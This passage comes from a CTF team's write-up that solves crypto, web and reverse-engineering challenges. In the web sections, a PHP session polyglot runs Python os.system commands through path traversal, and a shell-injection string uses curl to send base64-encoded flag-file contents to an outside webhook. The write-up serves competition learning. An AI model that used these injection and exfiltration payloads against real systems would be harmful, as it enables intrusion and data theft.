x1 <span style="color:#f92672">=</span> recover_payload([<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">31</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">127</span>, <span style="color:#ae81ff">255</span>], t)
<span style="color:#75715e"># x1 = 1d 3f 42 28 3b 54 3c db</span>
x2 <span style="color:#f92672">=</span> recover_payload([<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">31</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">127</span>, <span style="color:#ae81ff">255</span>], [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>]) <span style="color:#f92672">+</span> \
     recover_payload([<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>], t)
<span style="color:#75715e"># x2 = b5 97 ea 80 93 fc 94 73  11 11 11 11 11 11 11 11</span></code></pre></div>
<p>Submitting the collision pair to the netcat service, we have the flag. First blood!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">3k{1s_this_even_4_ha$h?_6b3c1686f7bf87}</code></pre></div>
<h2 id="crypto-warmup-crypto-353-points">crypto warmup (Crypto; 353 points)<a hidden class="anchor" aria-hidden="true" href="#crypto-warmup-crypto-353-points">#</a></h2>

<p>Solved by <em>TWY</em>.</p>

<h3 id="part-i-analysis">Part I. Analysis<a hidden class="anchor" aria-hidden="true" href="#part-i-analysis">#</a></h3>

<p>Main Function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">print(B) <span style="color:#75715e"># an integer array</span>

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(flag), <span style="color:#ae81ff">3</span>):
    print(do_magic(flag[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>], B))</code></pre></div>
<p>The function <code>do_magic</code> and the <code>weird_function_1</code> called:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">weird_function_1</span>(s):
    <span style="color:#66d9ef">return</span> sum([list(map(int,bin(ord(c))[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">8</span>))) <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> s], [])

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">do_magic</span>(OooO, B):
    <span style="color:#66d9ef">return</span> sum(m <span style="color:#f92672">*</span> b <span style="color:#66d9ef">for</span> m, b <span style="color:#f92672">in</span> zip(weird_function_1(OooO), B))</code></pre></div>
<p>Obviously B is given. Also, both the functions <code>do_magic</code> and <code>weird_function_1</code> are deterministic, and the values fed to the argument <code>OooO</code> in the function <code>do_magic</code> are always three-letter strings <em>(the last one may be shorter, but it is just equivalent to the three-letter string with null bytes padded after it)</em>, which means each 3-character string can be easily brute-forced. Also we can assume that all characters are ASCII printable <em>(except the null bytes)</em>.</p>

<h3 id="part-ii-solve-script">Part II. Solve Script<a hidden class="anchor" aria-hidden="true" href="#part-ii-solve-script">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> tqdm <span style="color:#f92672">import</span> tqdm
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">weird_function_1</span>(s):
    <span style="color:#66d9ef">return</span> sum([list(map(int,bin(ord(c))[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">8</span>))) <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> s], [])

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">do_magic</span>(OooO, B):
    <span style="color:#66d9ef">return</span> sum(m <span style="color:#f92672">*</span> b <span style="color:#66d9ef">for</span> m, b <span style="color:#f92672">in</span> zip(weird_function_1(OooO), B))

B <span style="color:#f92672">=</span> [<span style="color:#ae81ff">4267101277</span>, <span style="color:#ae81ff">4946769145</span>, <span style="color:#ae81ff">6306104881</span>, <span style="color:#ae81ff">7476346548</span>, <span style="color:#ae81ff">7399638140</span>, <span style="color:#ae81ff">1732169972</span>, <span style="color:#ae81ff">1236242271</span>, <span style="color:#ae81ff">5109093704</span>, <span style="color:#ae81ff">2163850849</span>, <span style="color:#ae81ff">6552199249</span>, <span style="color:#ae81ff">3724603395</span>, <span style="color:#ae81ff">3738679916</span>, <span style="color:#ae81ff">5211460878</span>, <span style="color:#ae81ff">642273320</span>, <span style="color:#ae81ff">3810791811</span>, <span style="color:#ae81ff">761851628</span>, <span style="color:#ae81ff">1552737836</span>, <span style="color:#ae81ff">4091151711</span>, <span style="color:#ae81ff">1601520107</span>, <span style="color:#ae81ff">3117875577</span>, <span style="color:#ae81ff">2485422314</span>, <span style="color:#ae81ff">1983900485</span>, <span style="color:#ae81ff">6150993150</span>, <span style="color:#ae81ff">2045278518</span>]

F <span style="color:#f92672">=</span> [<span style="color:#ae81ff">34451302951</span>, <span style="color:#ae81ff">58407890177</span>, <span style="color:#ae81ff">49697577713</span>, <span style="color:#ae81ff">45443775595</span>, <span style="color:#ae81ff">38537028435</span>, <span style="color:#ae81ff">47069056666</span>, <span style="color:#ae81ff">49165602815</span>, <span style="color:#ae81ff">43338588490</span>, <span style="color:#ae81ff">32970122390</span>]
flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> F:
    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> tqdm(range(<span style="color:#ae81ff">128</span> <span style="color:#f92672">**</span> <span style="color:#ae81ff">3</span>)):
        a <span style="color:#f92672">=</span> j <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">14</span>
        b <span style="color:#f92672">=</span> (j <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">7</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0b1111111</span>
        c <span style="color:#f92672">=</span> j <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0b1111111</span>
        <span style="color:#66d9ef">if</span> do_magic(chr(a) <span style="color:#f92672">+</span> chr(b) <span style="color:#f92672">+</span> chr(c), B) <span style="color:#f92672">==</span> i:
            flag <span style="color:#f92672">+=</span> chr(a) <span style="color:#f92672">+</span> chr(b) <span style="color:#f92672">+</span> chr(c)
            <span style="color:#66d9ef">break</span>
print(flag)</code></pre></div>
<p>Sample Output:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text"> 53%|███████████████▊              | 1108550/2097152 [00:17&lt;00:15, 62605.66it/s]
 97%|█████████████████████████████ | 2030516/2097152 [00:31&lt;00:01, 63928.93it/s]
 90%|██████████████████████████▉   | 1881845/2097152 [00:32&lt;00:03, 57390.00it/s]
 88%|██████████████████████████▎   | 1840875/2097152 [00:32&lt;00:04, 55971.72it/s]
 86%|█████████████████████████▉    | 1809008/2097152 [00:31&lt;00:05, 57432.73it/s]
 90%|███████████████████████████   | 1890915/2097152 [00:26&lt;00:02, 71159.66it/s]
 84%|█████████████████████████▏    | 1758950/2097152 [00:24&lt;00:04, 73218.48it/s]
 91%|███████████████████████████▍  | 1915809/2097152 [00:26&lt;00:02, 71046.21it/s]
 98%|█████████████████████████████▎| 2048000/2097152 [00:35&lt;00:00, 57756.23it/s]
CTF{w4rmup-kn4ps4ck-ftw!}</code></pre></div>
<p>Total time: 254 seconds</p>

<h3 id="part-iii-extra-notes">Part III. Extra Notes<a hidden class="anchor" aria-hidden="true" href="#part-iii-extra-notes">#</a></h3>

<p>Actually time can be saved if we start from the lowercase character end instead.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">a <span style="color:#f92672">=</span> <span style="color:#ae81ff">127</span> <span style="color:#f92672">-</span> (j <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">14</span>)
b <span style="color:#f92672">=</span> <span style="color:#ae81ff">127</span> <span style="color:#f92672">-</span> ((j <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">7</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0b1111111</span>)
c <span style="color:#f92672">=</span> <span style="color:#ae81ff">127</span> <span style="color:#f92672">-</span> (j <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0b1111111</span>)</code></pre></div>
<p>Sample Output:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text"> 47%|██████████████▌                | 988601/2097152 [00:15&lt;00:17, 63563.44it/s]
  3%|█                               | 66635/2097152 [00:01&lt;00:34, 59598.76it/s]
 10%|███▏                           | 215306/2097152 [00:03&lt;00:30, 60928.54it/s]
 12%|███▊                           | 256276/2097152 [00:04&lt;00:30, 61312.85it/s]
 14%|████▎                          | 288143/2097152 [00:04&lt;00:29, 60746.88it/s]
 10%|███                            | 206236/2097152 [00:03&lt;00:29, 63268.73it/s]
 16%|████▉                          | 338201/2097152 [00:05&lt;00:28, 61754.37it/s]
  9%|██▋                            | 181342/2097152 [00:02&lt;00:31, 61100.82it/s]
  2%|▋                               | 49151/2097152 [00:00&lt;00:33, 61221.49it/s]
CTF{w4rmup-kn4ps4ck-ftw!}</code></pre></div>
<p>Total time: 37 seconds</p>

<h2 id="secure-roots-crypto-475-points">secure roots (Crypto; 475 points)<a hidden class="anchor" aria-hidden="true" href="#secure-roots-crypto-475-points">#</a></h2>

<p>Solved by <em>Mystiz</em>.</p>

<p>In this challenge, there is a service that requires us to sign in. We are given a token for signing in as the <code>guest</code>, and the objective is to sign in as <code>3k-admin</code>.</p>

<p>To be authenticated as $m$, one must provide an integer $r$ and a string $u$ such that</p>

<p><span  class="math">\[r^2 \equiv \text{SHA256}(m\ \|\ u)\ (\text{mod}\ n),\]</span></p>

<p>where $n$ is a product of two primes. The decryption algorithm is implemented below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(self, c):
	p, q <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>private
	mp <span style="color:#f92672">=</span> pow(c, (p<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">//</span><span style="color:#ae81ff">4</span>, p)
	mq <span style="color:#f92672">=</span> pow(c, (q<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">//</span><span style="color:#ae81ff">4</span>, q)
	_, yp, yq <span style="color:#f92672">=</span> xgcd(p, q)
	r <span style="color:#f92672">=</span> (yp <span style="color:#f92672">*</span> p <span style="color:#f92672">*</span> mq <span style="color:#f92672">+</span> yq <span style="color:#f92672">*</span> q <span style="color:#f92672">*</span> mp) <span style="color:#f92672">%</span> (self<span style="color:#f92672">.</span>public)
	<span style="color:#66d9ef">return</span> r

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sign</span>(self, m):
	U <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">20</span>)
	c <span style="color:#f92672">=</span> int(hashlib<span style="color:#f92672">.</span>sha256(m <span style="color:#f92672">+</span> U)<span style="color:#f92672">.</span>hexdigest(), <span style="color:#ae81ff">16</span>)
	r <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>decrypt(c)
	<span style="color:#66d9ef">return</span> (r, int(U<span style="color:#f92672">.</span>hex(), <span style="color:#ae81ff">16</span>))</code></pre></div>
<p>The decryption algorithm is implemented in the same way as Wikipedia<sup class="footnote-ref" id="fnref:robin-decryption"><a class="footnote" href="#fn:robin-decryption">1</a></sup> suggested. Does it mean that the signing algorithm is safe? No.</p>

<p>For Rabin cryptosystem, the ciphertext are quadradic residues because they are the square of their corresponding plaintexts. However, for the signing algorithm in the challenge, $h := \text{SHA256}(m\ \|\ u)$ is not necessarily a quadratic residue. In such cases, $r^2 \not\equiv h\ (\text{mod}\ n)$.</p>

<p>For <code>decrypt</code>, we have $r \equiv y_p\cdot p\cdot m_q + y_q\cdot q\cdot m_q\ (\text{mod}\ n)$ with $y_p p + y_q q = 1$.</p>

<p>Taking modulo $p$, we have $r \equiv y_p\cdot q\cdot m_p\equiv h^{(p+1)/4}\cdot q\cdot q^{-1}\equiv h^{(p+1)/4} \ (\text{mod}\ p)$. That said, $r^4 \equiv h^{p+1}\equiv h^2\ (\text{mod}\ p)$. That implies $r^2 \equiv \pm h\ (\text{mod}\ p)$. That implies $r^2 - h \equiv 0\ \text{or}\ -2h\ (\text{mod}\ p)$. Likewise $r^2 - h \equiv 0\ \text{or}\ -2h\ (\text{mod}\ q)$.</p>

<p>Assuming that $r^2 - h\equiv 0\ (\text{mod}\ p)$ and $r^2 - h\not\equiv 0\ (\text{mod}\ q)$, we have</p>

<p><span  class="math">\[\gcd(n, r^2 - h) = p.\]</span></p>

<p>Therefore we are able retrieve a prime factor of $n$. After that, it is easy to forge tokens to sign in as <code>3k-admin</code> and win the flag.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">CTF{f4ulty_s1gn4ture_f41l}</code></pre></div>
<h2 id="onlinecompiler-web-425-points">online_compiler (Web; 425 points)<a hidden class="anchor" aria-hidden="true" href="#onlinecompiler-web-425-points">#</a></h2>

<p>Solved by <em>ozetta</em>.</p>

<p>The web service allows you to create a PHP file and execute a file in PHP or Python.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/save&#39;</span>,methods <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;POST&#39;</span>])
<span style="color:#a6e22e">@cross_origin</span>()
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">save</span>():
    c_type<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;c_type&#39;</span>]
    print(<span style="color:#e6db74">&#39;ctype-(&gt;&#39;</span><span style="color:#f92672">+</span>c_type)
    <span style="color:#66d9ef">if</span> (c_type <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;php&#39;</span>):
        code<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;code&#39;</span>]
        <span style="color:#66d9ef">if</span> (len(code)<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">100</span>):
            filename<span style="color:#f92672">=</span>get_random_string(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;.php&#39;</span>
            path<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;/home/app/test/&#39;</span><span style="color:#f92672">+</span>filename
            f<span style="color:#f92672">=</span>open(path,<span style="color:#e6db74">&#39;w&#39;</span>)
            f<span style="color:#f92672">.</span>write(code)
            f<span style="color:#f92672">.</span>close()
            <span style="color:#66d9ef">return</span> filename
        
        <span style="color:#66d9ef">else</span>:
            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;failed&#39;</span>
    <span style="color:#e6db74">&#34;&#34;&#34;elif (c_type == &#39;python&#39;):
</span><span style="color:#e6db74">        code=request.args.get(&#39;code&#39;)
</span><span style="color:#e6db74">        if (len(code)&lt;30):
</span><span style="color:#e6db74">            filename=get_random_string(6)+&#39;.py&#39;
</span><span style="color:#e6db74">            path=&#39;/home/app/testpy/&#39;+filename
</span><span style="color:#e6db74">            f=open(path,&#39;w&#39;)
</span><span style="color:#e6db74">            f.write(code)
</span><span style="color:#e6db74">            f.close()
</span><span style="color:#e6db74">            return filename
</span><span style="color:#e6db74">        else:
</span><span style="color:#e6db74">            return &#39;failed&#39;&#34;&#34;&#34;</span></code></pre></div>
<p>The file creation part is straightforward. It allows you to create a php file with length less than 100. The comment part looks suspicious and many players asked whether the challenge design is wrong. Because the file will be executed later, at a first glance I thought it is asking us to write a polygot for php and python. But apparently it is not the case:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/compile&#39;</span>,methods <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;POST&#39;</span>])
<span style="color:#a6e22e">@cross_origin</span>()
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">compile</span>():
    c_type<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;c_type&#39;</span>]
    filename<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;filename&#39;</span>]
    <span style="color:#66d9ef">if</span> (c_type <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;php&#39;</span>):
        <span style="color:#66d9ef">if</span> (filename[<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>:]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;php&#39;</span>):
            <span style="color:#66d9ef">if</span> (check_file(<span style="color:#e6db74">&#39;/home/app/test/&#39;</span><span style="color:#f92672">+</span>filename)):
                path<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;/home/app/test/&#39;</span><span style="color:#f92672">+</span>filename
                cmd<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;php -c php.ini &#39;</span><span style="color:#f92672">+</span>path
                p <span style="color:#f92672">=</span> Popen(cmd, shell<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, stdout<span style="color:#f92672">=</span>PIPE, stderr<span style="color:#f92672">=</span>PIPE)
                stdout, stderr <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>communicate()
                <span style="color:#66d9ef">return</span> stdout
            <span style="color:#66d9ef">else</span>:
                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;failed&#39;</span>
        <span style="color:#66d9ef">else</span>:
            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;noop&#39;</span>
    <span style="color:#66d9ef">elif</span> (c_type <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;python&#39;</span>):
        <span style="color:#66d9ef">if</span> (filename[<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>:]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;py&#39;</span>):
            <span style="color:#66d9ef">if</span> (check_file(<span style="color:#e6db74">&#39;/home/app/test/&#39;</span><span style="color:#f92672">+</span>filename)):
                cmd<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;python3 &#39;</span><span style="color:#f92672">+</span>filename
                p <span style="color:#f92672">=</span> Popen(cmd, shell<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, stdout<span style="color:#f92672">=</span>PIPE, stderr<span style="color:#f92672">=</span>PIPE)
                stdout, stderr <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>communicate()
                <span style="color:#66d9ef">return</span> stdout
            <span style="color:#66d9ef">else</span>:
                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;failed&#39;</span>
        <span style="color:#66d9ef">else</span>:
            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;noop&#39;</span></code></pre></div>
<p>The Python part got a filename checking, but interestingly instead of checking <code>.py</code>, it only checks <code>py</code>. As expected, the PHP part got a lot of restriction on <code>disable_functions</code> and <code>disable_classes</code>, so we cannot directly write a py file through functions like <code>file_put_contents</code>. By running <code>array_diff</code> with the list of <code>disable_functions</code> and <code>get_defined_functions()[&quot;internal&quot;]</code>, it shows a bunch of session-related functions. So apparently we need to create a session file that is executable by Python. Somehow it is a kind of polygot as well...</p>

<p>Final payload:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">session_id</span>(<span style="color:#e6db74">&#39;creepy&#39;</span>);<span style="color:#a6e22e">session_start</span>();$_SESSION[<span style="color:#e6db74">&#34;__import__(&#39;os&#39;).system(&#39;ls /&#39;)#&#34;</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;</code></pre></div>
<p>The session file it creates will look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;ls /&#39;</span>)<span style="color:#75715e">#|i:1;</span></code></pre></div>
<p>The <code>#</code> is important to comment out the stuff afterwards. Then reuse the script in the UI:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#34;http://&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hostname</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;:5000/compile&#34;</span>,
    {
      <span style="color:#a6e22e">c_type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;python&#34;</span>,
      <span style="color:#a6e22e">filename</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;../../../../tmp/sess_creepy&#34;</span>
    },<span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">data</span>,<span style="color:#a6e22e">status</span>){
      document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;aab&#34;</span>).<span style="color:#a6e22e">innerHTML</span><span style="color:#f92672">=</span><span style="color:#a6e22e">data</span>;
    })</code></pre></div>
<h2 id="emoji-web-438-points">Emoji (Web; 438 points)<a hidden class="anchor" aria-hidden="true" href="#emoji-web-438-points">#</a></h2>

<p>Solved by <em>ozetta</em>.</p>

<p>The web service will fetch a list of images and sign them to get a MAC. A user can request downloading the image, which will trigger a command execution. At a first glance it needs trick like length extension attack to spoof the MAC but it is using hmac instead of pure sha256. But in fact it will sign any resource fetched by the service:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">fetch_and_parse</span>($page){
  $a<span style="color:#f92672">=</span><span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#34;https://raw.githubusercontent.com/3kctf2021webchallenge/downloader/master/&#34;</span><span style="color:#f92672">.</span>$page<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;.html&#34;</span>);
  <span style="color:#a6e22e">preg_match_all</span>(<span style="color:#e6db74">&#34;/&lt;img src=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">(.*?)</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&gt;/&#34;</span>, $a,$ma);
  <span style="color:#66d9ef">return</span> $ma;
}</code></pre></div>
<p>And it could be spoofed like this:</p>

<p><code>http://emoji.2021.3k.ctf.to/?dir=../../../ozetta/reponame/main/filename</code></p>

<p>The vulnerability is actually similar to this one 😏:</p>

<p><a href="https://web.archive.org/web/20201118140207/https://app.crackingthecryptic.com/sudoku/?puzzleid=..%2F..%2Fsudoku-sandbox-escape.appspot.com%2Fo%2Fpasswd">https://web.archive.org/web/20201118140207/https://app.crackingthecryptic.com/sudoku/?puzzleid=..%2F..%2Fsudoku-sandbox-escape.appspot.com%2Fo%2Fpasswd</a></p>

<p>The difference is the challenge uses Github but CTC used Firebase previously, and both of them are serving the resource in the form <code>https://domain/username/resource</code>, so by using directory traversal, one can easily point the resource from the owner's account to the attacker's account.</p>

<p>Then we can obtain a valid token by putting some images in the form of <code>&lt;img src=&quot;...&quot;&gt;</code> on the page. We can now go for the command execution part:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$d <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;bash -c </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">curl -o /dev/null &#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">escapeshellarg</span>(<span style="color:#e6db74">&#34;https://raw.githubusercontent.com/3kctf2021webchallenge/downloader/master/&#34;</span><span style="color:#f92672">.</span>$url)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;  </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>;</code></pre></div>
<p>The <code>bash -c</code> is suspicious, and <code>escapeshellarg</code> only handles single quote but not double quote. By injecting double quote we can execute arbitrary commands:</p>
<pre tabindex="0"><code>&#34;;curl webhook -d z=$(grep 3k{ index.php|base64);#&#34;</code></pre>
<h2 id="crackme-reverse-470-points">Crackme (Reverse; 470 points)<a hidden class="anchor" aria-hidden="true" href="#crackme-reverse-470-points">#</a></h2>

<p>Solved by <em>cdemirer</em>, <em>ozetta</em> and <em>Mystiz</em>.</p>

<div class="alert warning">
  This writeup is written by <em>Mystiz</em> because <em>cdemirer</em> is busy having his exams. However, <em>Mystiz</em> knew almost nothing about the challenge.
</div>
  

<h3 id="part-i-kickstarting-the-challenge">Part I. Kickstarting the Challenge<a hidden class="anchor" aria-hidden="true" href="#part-i-kickstarting-the-challenge">#</a></h3>

<p>We are provided a VM-type binary where the instructions is also inscribed in the binary (stored in <code>byte_1040</code>). The first 64 bytes being:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">06 00 00 06 01 01 06 02  02 06 03 03 03 00 00 03
01 00 03 02 00 03 03 00  08 00 00 05 00 01 08 00
00 05 00 02 08 00 00 05  00 03 08 00 00 06 00 04
06 01 05 06 02 06 06 03  07 03 00 00 03 01 00 03</code></pre></div>
<p>When we try to execute the binary, we are asked to enter the flag. Let's try to send something in:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ ./crackme 
Enter the flag: ctf{THi5_FL46_I5_lE91t_4ND_Y0UR_CHeCK3R_SUXx&amp;}
Good Job</code></pre></div>
<p>We are done!</p>

<p>However, unfortunately, the scoreboard does not accept our flag... Why? Let's look at the binary in detailed.</p>

<h3 id="part-ii-reversing-the-virtual-machine">Part II. Reversing the Virtual Machine<a hidden class="anchor" aria-hidden="true" href="#part-ii-reversing-the-virtual-machine">#</a></h3>

<p>At suggested in <code>sub_93A</code>, each instruction consists of three bytes. The first byte is the <em>opcode</em>, and the rest are the parameters. There are 14 opcodes supported:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Instruction Description 
----------- -----------
01 A B      REG[A] *= B
02 A B      REG[A] -= B
03 A B      REG[A] = ~REG[A]
04 A B      REG[A] ^= MEM[B]
05 A B      REG[A] = REG[B]
06 A B      REG[A] = MEM[B]
07 A B      IF REG[0] != 0: IP += A
08 A B      putc(REG[0])
09 A B      exit(REG[0])
10 A B      REG[0] = getc()
11 A B      REG[A] &lt;&lt;= B &amp; 0x1F
12 A B      REG[A] &amp;= MEM[B]
13 A B      REG[A] |= MEM[B]
14 A B      REG[A] += REG[B]</code></pre></div>
<p>There are 2137 bytes in <code>byte_1040</code>. The first 2048 bytes are the instructions and the remaining 89 bytes are the memory (first eight bytes being <code>ba 91 8b 9a 8d df 8b 97</code>). Moreover, there are four bytes for the register. Note that <code>IP</code> above represents the <em>instruction pointer</em>, which will be increased by 3 unless <code>IP += A</code> is triggered. Notably, <code>IP</code> never decreases.</p>

<p>With that, let's try to understand the first few instructions:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">06 00 00    REG[0] = MEM[0]  // REG[0] = 0xba
06 01 01    REG[1] = MEM[1]  // REG[1] = 0x91
06 02 02    REG[2] = MEM[2]  // REG[2] = 0x8b
